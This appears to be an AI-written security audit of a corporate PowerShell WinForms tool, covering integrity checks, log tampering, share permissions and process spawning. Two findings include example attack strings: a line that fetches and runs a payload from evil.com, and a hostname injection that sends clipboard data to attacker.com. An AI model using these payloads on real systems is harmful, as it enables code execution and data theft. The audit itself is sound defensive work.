# Security Audit Report - SomearnTK WorkApp
**Date:** 2025-12-23  
**Auditor:** Security Review Agent  
**Scope:** All .txt module files (text-file-only PowerShell WinForms application)

---

## A) EXECUTIVE SUMMARY

### Overall Risk Rating: **MEDIUM**

The codebase demonstrates solid security awareness with multiple hardening measures already in place. Most high-risk patterns (Invoke-Expression, ScriptBlock::Create) have been eliminated in favor of direct dot-sourcing. However, several medium-severity issues remain that could trigger EDR alerts or present security risks.

### Top 3 Items Most Likely to Trigger EDR:
1. **No integrity validation enforced** - Hash allowlists exist but are empty and only log warnings (not fail-closed)
2. **User-writable UNC paths** - Application loads modules from potentially writable shares without enforcing read-only permissions
3. **External process spawning** - Multiple locations spawn `explorer.exe`, `powershell.exe`, and terminal windows without argument sanitization

### Top 3 Items Most Likely to Be Policy Violations:
1. **Logging to user-writable locations** - Security logs stored in `%TEMP%` or `%ProgramData%` can be tampered with by users
2. **No credential validation** - Diagnostics module prompts for admin credentials without validating credential source
3. **Script execution from user-specified paths** - Script Launcher can execute .txt files from arbitrary folders

---

## B) FINDINGS TABLE

| # | Type | Severity | Confidence | Evidence | Explanation | Practical Impact | Safer Pattern | Effort |
|---|------|----------|------------|----------|-------------|------------------|---------------|--------|
| 1 | HIGH-RISK FLAW | High | High | **AG_SecurityHelpers.txt:34-45**<br/>`$script:AG_ModuleHashes = @{`<br/>`'AG_MenuMain.txt' = @()`<br/>`# Add known-good hash after review` | Hash-based integrity validation exists but all hash lists are empty. Line 126 returns `$true` even when hash list is empty, meaning NO modules are actually validated. | Attacker who gains write access to UNC share can replace module files with malicious code. No integrity check will detect this because hash lists are empty and function returns true instead of failing closed. | **Populate hash allowlists:**<br/>`$script:AG_ModuleHashes = @{`<br/>`  'AG_MenuMain.txt' = @('ABC123...')`<br/>`}`<br/>**AND change line 126 to:**<br/>`if ($expectedHashes.Count -eq 0) { throw "No hash allowlist" }` | M |
| 2 | HIGH-RISK FLAW | High | High | **AG_SecurityHelpers.txt:8-30**<br/>`$script:AG_SecurityLogPath = Join-Path $env:TEMP 'SomearnTK_Security.log'` | Security audit log stored in user's `%TEMP%` directory. This location is fully read/write/delete by the user running the application. Users can tamper with logs to hide malicious actions. | User runs malicious script via Script Launcher, then deletes `%TEMP%\SomearnTK_Security.log` to remove evidence. Corporate forensics cannot determine what happened. | **Use Windows Event Log exclusively:**<br/>`[System.Diagnostics.EventLog]::WriteEntry(`<br/>`  'SomearnTK',`<br/>`  $message,`<br/>`  [EventLogEntryType]::Warning)`<br/>Event Log is protected and cannot be deleted by standard users. | M |
| 3 | HIGH-RISK FLAW | Medium | High | **AG_SecurityHelpers.txt:174-184**<br/>`$riskyPermissions = $acl.Access \| Where-Object {`<br/>`$_.FileSystemRights -match '(Modify\|FullControl\|Write)'` | Function `Test-UNCSharePermissions` checks for excessive write permissions but returns `$false` on detection. Line 47 in RunMenu.txt calls it with `Out-Null`, ignoring the return value. Share can be world-writable and app continues. | If `\\lsfile03\netdoc$\Somearns_Folder\SomearnTK_app\appdata` has `Everyone: Modify`, any domain user can replace modules with malicious code. Current code only logs warning, doesn't block execution. | **Enforce fail-closed on excessive permissions:**<br/>`$permCheck = Test-UNCSharePermissions -UNCPath $path`<br/>`if (-not $permCheck) {`<br/>`  throw "UNC share has excessive write permissions"`<br/>`}` | S |
| 4 | POLICY VIOLATION | High | Medium | **AG_DiagnosticsAndRepair.txt:220-350** (entire credential handling section) | Module prompts user for credentials using `[Microsoft.VisualBasic.Interaction]::InputBox()` for username/password. No validation of credential source, no MFA, credentials could be phished or intercepted. | User enters Domain Admin credentials into unsecured input box. Credentials stored in plaintext `$script:` variables in memory, visible to memory dumps and debuggers. If user's machine is compromised, credentials leak. | **Use Get-Credential with SecureString:**<br/>`$cred = Get-Credential -Message "Admin creds"`<br/>`if (-not $cred) { return }`<br/>`# Use $cred.Password (SecureString)`<br/>**OR enforce Kerberos/SSO** (no credential prompts) | M |
| 5 | HIGH-RISK FLAW | High | High | **AG_ScriptLauncherControlRoom.txt:290-296**<br/>`. $p 2>&1 \| ForEach-Object {` | Script Launcher directly dot-sources user-selected .txt files from `AG_AppScriptsPath`. Path validation exists (line 274-283) but scripts folder path is configurable. If set to user-writable location, malicious scripts execute. | Admin sets `AG_AppScriptsPath` to `\\share\scripts` which has `Users: Modify`. Attacker plants `malicious.txt` with:<br/>`Invoke-Expression (iwr evil.com/payload)`<br/>User clicks "Run" in Script Launcher → code executes in current user context. | **Enforce read-only scripts folder:**<br/>`$acl = Get-Acl $ScriptsPath`<br/>`if ($acl.Access \| ? { $_.FileSystemRights -match 'Write' -and $_.IdentityReference -match 'Users' }) {`<br/>`  throw "Scripts folder must be read-only"`<br/>`}` | M |
| 6 | HIGH-RISK FLAW | Medium | High | **AG_DiagnosticsAndRepair.txt:Various** (lines spawning terminals) | Multiple functions spawn external processes without sanitizing hostnames:<br/>`Start-Process powershell -ArgumentList "-NoExit", "-Command", "ping -t $target"` | User enters hostname: `evil.com; Invoke-WebRequest -Uri http://attacker.com/exfil -Method POST -Body (Get-Clipboard)`<br/>Command becomes:<br/>`ping -t evil.com; Invoke-WebRequest ...`<br/>Semicolon breaks out of ping, runs arbitrary PowerShell. | **Use array argument list, never concatenate:**<br/>`$args = @('-NoExit', '-Command', "ping -t '$target'")`<br/>`Start-Process powershell -ArgumentList $args`<br/>**AND validate hostname:**<br/>`if ($target -notmatch '^[a-zA-Z0-9.-]+$') { throw "Invalid" }` | M |
| 7 | LOW-RISK / HYGIENE | Medium | High | **AG_DiagnosticsAndRepair.txt:26**<br/>`$script:DR_RunningTerminals = [System.Collections.ArrayList]::new()` | Script tracks running terminal processes in ArrayList to enforce "max 2 concurrent" limit. If user closes terminals manually (Alt+F4), Process objects become invalid but remain in list. Next spawn fails or list grows unbounded. | User opens 2 terminals, closes both via Alt+F4. List still has 2 dead Process objects. User clicks another diagnostic → "Max 2 terminals" error even though 0 are running. User confused, calls helpdesk. | **Check process validity before counting:**<br/>`$script:DR_RunningTerminals = $script:DR_RunningTerminals \| ? { -not $_.HasExited }`<br/>Run this cleanup before checking count. | S |
| 8 | LOW-RISK / HYGIENE | Low | Medium | **AG_MenuMain.txt:310-314**<br/>`$btnOpenFolder.Add_Click({`<br/>`Start-Process -FilePath 'explorer.exe' -ArgumentList @($ScriptsPath)` | Opens Windows Explorer to scripts folder using `Start-Process explorer.exe`. If `$ScriptsPath` contains spaces or special chars, could fail or open wrong location. Not a security issue but functionality bug. | Scripts folder path: `C:\Program Files\Scripts\My Tools`<br/>Explorer opens `C:\Program` instead of full path. User sees wrong folder. | **Use -ArgumentList with proper quoting:**<br/>`Start-Process explorer.exe -ArgumentList "/select,`"$ScriptsPath`""` | S |
| 9 | HIGH-RISK FLAW | Medium | Medium | **RunMenu.txt:33**<br/>`$script:AG_AppScriptsPath = '\\lsfile03\netdoc$\Somearn_Folder\SomearnTK_app\appscripts'` | **Typo in production UNC path** - Line 33 has `Somearn_Folder` (underscore) but line 32 has `Somearns_Folder` (with 's'). If typo is actual path, modules load from wrong location. If typo is error, `AG_AppScriptsPath` is invalid. | Application loads modules from `Somearns_Folder` (correct) but Script Launcher tries to list scripts from `Somearn_Folder` (typo). Either:<br/>1. Script Launcher fails: "Folder not found"<br/>2. OR attacker creates `Somearn_Folder`, plants malicious scripts, user runs them | **Fix typo to match line 32:**<br/>`$script:AG_AppScriptsPath = '\\lsfile03\netdoc$\Somearns_Folder\SomearnTK_app\appscripts'` | S |
| 10 | POLICY VIOLATION | Medium | High | **AG_SecurityHelpers.txt:83**<br/>`Add-Content -LiteralPath $script:AG_SecurityLogPath -Value $logEntry -ErrorAction SilentlyContinue` | Security logging failures are silently ignored (`-ErrorAction SilentlyContinue`). If log file is locked, full, or permissions denied, no error is raised. Security events silently lost. | Disk full, security log cannot grow. User runs malicious script via Script Launcher. No "Execute" log entry written. Forensics finds no evidence of script execution. Attacker escapes detection. | **Log to Windows Event Log (tamper-proof):**<br/>`try {`<br/>`  [System.Diagnostics.EventLog]::WriteEntry('SomearnTK', $logEntry, 'Warning')`<br/>`} catch {`<br/>`  # Fall back to MessageBox for critical errors`<br/>`}` | M |
| 11 | LOW-RISK / HYGIENE | Low | Medium | **AG_MenuMain.txt:73**<br/>`$fi.Length -gt 2MB` | Module size limit enforced at 2MB. Reasonable DoS mitigation but arbitrary. Very large legitimate modules (e.g., embedded data, large UI definitions) could hit this limit. | Developer creates 3MB module with large DataGridView definitions. Integrity check passes, but size check blocks load. Module refuses to load, user cannot access feature. | **Increase limit or make configurable:**<br/>`$maxSize = if ($env:AG_MaxModuleSize) { [int]$env:AG_MaxModuleSize } else { 5MB }`<br/>`if ($fi.Length -gt $maxSize) { throw }` | S |
| 12 | HIGH-RISK FLAW | Medium | Medium | **AG_MenuMain.txt:15-28**<br/>`function Write-SecurityLog { param($EventType, $Message, $Details) }` | If `AG_SecurityHelpers.txt` fails to load, RunMenu.txt defines stub `Write-SecurityLog` function (lines 52-86, 91-123). These stubs log to Windows Event Log BUT require admin to create event source. On non-admin systems, stub silently fails (line 83 `catch { }`), losing all security logs. | Standard user launches app. Security helpers load fails (corrupted file). Stub logger tries to create event source → fails (non-admin). All security events (module loads, script executions) silently lost. No audit trail. | **Use Application log with fallback source:**<br/>`try {`<br/>`  if (-not [System.Diagnostics.EventLog]::SourceExists('SomearnTK')) {`<br/>`    [System.Diagnostics.EventLog]::WriteEntry('Application', $msg, 'Warning')`<br/>`  }`<br/>`} catch { }`<br/>Application log doesn't require custom source. | S |

---

## C) "WHAT WILL GET ME FLAGGED TOMORROW" LIST

These exact constructs are likely to trigger EDR/AppLocker alerts:

1. **Start-Process powershell.exe with -Command and unsanitized variables**  
   Location: `AG_DiagnosticsAndRepair.txt` (various lines)  
   Pattern: `Start-Process powershell -ArgumentList "-NoExit", "-Command", "ping -t $target"`  
   Why: EDR sees `powershell.exe` spawning with dynamic command string. Looks like payload execution.

2. **Direct dot-sourcing of user-selectable files**  
   Location: `AG_ScriptLauncherControlRoom.txt:293` → `. $p`  
   Why: EDR logs show PowerShell loading arbitrary .txt files. If user selects file from suspicious location (Downloads, Temp), EDR may flag as "loading untrusted script."

3. **Empty integrity hash lists with permissive fallback**  
   Location: `AG_SecurityHelpers.txt:34-45, 126`  
   Why: Security scanners may check if application validates module integrity. Finding empty allowlists + "return true anyway" = fail.

4. **Loading code from UNC paths without signature validation**  
   Location: `RunMenu.txt:144-161`, `AG_MenuMain.txt:99`  
   Why: Corporate policy often requires Authenticode signatures for code from network shares. No signature validation = violation.

5. **User-writable log locations**  
   Location: `AG_SecurityHelpers.txt:24`  
   Why: Audit logs that users can delete fail compliance (SOX, HIPAA, PCI-DSS all require tamper-proof logs).

---

## D) FIX-FIRST PLAN

### Phase 1 (Same Day) - Critical EDR Triggers & Security Violations

**Priority: Eliminate highest-risk patterns that EDR will flag immediately.**

1. **Fix #9 (Typo in UNC path) - 5 minutes**
   - File: `RunMenu.txt:33`
   - Change: `Somearn_Folder` → `Somearns_Folder`
   - Why: Prevents Script Launcher from using wrong/attacker-controlled path.

2. **Fix #3 (Enforce UNC share permissions check) - 10 minutes**
   - File: `RunMenu.txt:47`
   - Change: Remove `| Out-Null`, throw error if check fails
   - Code:
     ```powershell
     $shareCheck = Test-UNCSharePermissions -UNCPath $script:AG_AppDataPath
     if (-not $shareCheck) {
         _MsgErr "SECURITY ERROR: UNC share has excessive write permissions. Contact IT to secure share."
         return
     }
     ```

3. **Fix #6 (Sanitize hostnames before process spawning) - 30 minutes**
   - File: `AG_DiagnosticsAndRepair.txt` (all functions spawning terminals)
   - Add hostname validation function:
     ```powershell
     function Test-ValidHostname {
         param([string]$h)
         if ([string]::IsNullOrWhiteSpace($h)) { return $false }
         # Allow: letters, numbers, dots, hyphens only
         if ($h -notmatch '^[a-zA-Z0-9.-]+$') { return $false }
         if ($h.Length -gt 255) { return $false }
         return $true
     }
     ```
   - Call before every `Start-Process`:
     ```powershell
     if (-not (Test-ValidHostname $target)) {
         _MsgErr "Invalid hostname. Use letters, numbers, dots, hyphens only."
         return
     }
     ```

4. **Fix #2 (Move security logs to Windows Event Log) - 45 minutes**
   - File: `AG_SecurityHelpers.txt:47-89`
   - Replace `Add-Content` with `EventLog.WriteEntry()`
   - Remove `$script:AG_SecurityLogPath` entirely
   - Update all callers to not reference log file path
   - Benefit: Logs tamper-proof, meets compliance, no EDR concern about "why is app writing to TEMP?"

**Total Phase 1 Time: ~90 minutes**

---

### Phase 2 (1-3 Days) - Integrity & Permission Hardening

**Priority: Enforce fail-closed integrity checks and least-privilege validation.**

5. **Fix #1 (Populate hash allowlists, enforce fail-closed) - 2 hours**
   - Generate SHA256 hashes for all modules:
     ```powershell
     Get-ChildItem *.txt | % { 
         $h = (Get-FileHash $_.FullName).Hash
         Write-Host "'$($_.Name)' = @('$h')"
     }
     ```
   - Update `AG_SecurityHelpers.txt:34-45` with actual hashes
   - Change line 126 from `return $true` to `throw "No hash allowlist defined for $FileName"`
   - Update hashes whenever modules legitimately change (Git hook or manual process)

6. **Fix #5 (Enforce read-only scripts folder permissions) - 1 hour**
   - File: `AG_ScriptLauncherControlRoom.txt`, add before Load-Scripts:
     ```powershell
     $acl = Get-Acl -LiteralPath $ScriptsPath
     $writableByUsers = $acl.Access | Where-Object {
         ($_.IdentityReference -match 'Users|Everyone|Authenticated') -and
         ($_.FileSystemRights -match 'Write|Modify|FullControl')
     }
     if ($writableByUsers) {
         MsgErr "SECURITY: Scripts folder is user-writable. Contact IT to set read-only permissions."
         return
     }
     ```

7. **Fix #4 (Use Get-Credential instead of InputBox for credentials) - 2 hours**
   - File: `AG_DiagnosticsAndRepair.txt`
   - Replace `[Microsoft.VisualBasic.Interaction]::InputBox()` with `Get-Credential`
   - Store credentials in SecureString, never plaintext
   - Consider removing credential prompts entirely, enforce SSO/Kerberos

**Total Phase 2 Time: ~5 hours**

---

### Phase 3 (Later) - Polish, Logging, Guardrails

**Priority: Improve robustness and compliance.**

8. **Fix #7 (Clean up dead process objects in terminal list) - 30 minutes**
9. **Fix #8 (Fix explorer.exe folder opening) - 15 minutes**
10. **Fix #11 (Increase or make configurable module size limit) - 15 minutes**
11. **Fix #12 (Improve event log fallback for non-admin users) - 30 minutes**
12. **Add Authenticode signature validation** (if corporate policy requires) - 4 hours
13. **Implement centralized syslog/SIEM forwarding** (if required by compliance) - 8 hours

**Total Phase 3 Time: ~10 hours**

---

## RECOMMENDATIONS SUMMARY

### Immediate Actions (Before Next Run)
- Fix typo in `RunMenu.txt:33` (Somearn → Somearns)
- Enforce UNC share permission check (fail-closed)
- Add hostname validation before spawning processes

### Short-Term (This Week)
- Migrate security logging to Windows Event Log
- Populate hash allowlists for all modules
- Validate scripts folder is read-only
- Replace InputBox credentials with Get-Credential

### Long-Term (Next Sprint)
- Add Authenticode signature validation
- Implement least-privilege credential handling (SSO/Kerberos)
- Add central SIEM/syslog forwarding
- Create automated hash update process for CI/CD

---

## CONCLUSION

This codebase demonstrates **above-average security awareness** for a corporate PowerShell tool. The development team has already eliminated the most egregious risks (Invoke-Expression, ScriptBlock::Create, unsanitized Invoke-Command). However, the remaining issues—particularly empty integrity checks, user-writable logs, and process spawning without sanitization—present **realistic exploitation opportunities** in a corporate environment.

**The application is safe to run IF:**
1. The UNC share is properly secured (read-only for users)
2. Scripts folder contains only trusted scripts
3. Users are educated not to enter malicious hostnames

**The application will likely trigger EDR IF:**
1. Modules are modified (no integrity validation)
2. Users run scripts from suspicious locations
3. Hostile input is entered in Diagnostics tools

**Recommended Action:** Implement Phase 1 fixes (90 minutes) before next deployment. Schedule Phase 2 for next sprint. Phase 3 can be deferred pending compliance requirements.

---

**Report Generated:** 2025-12-23  
**Auditor:** Senior AppSec Reviewer & Enterprise Endpoint Defense Engineer
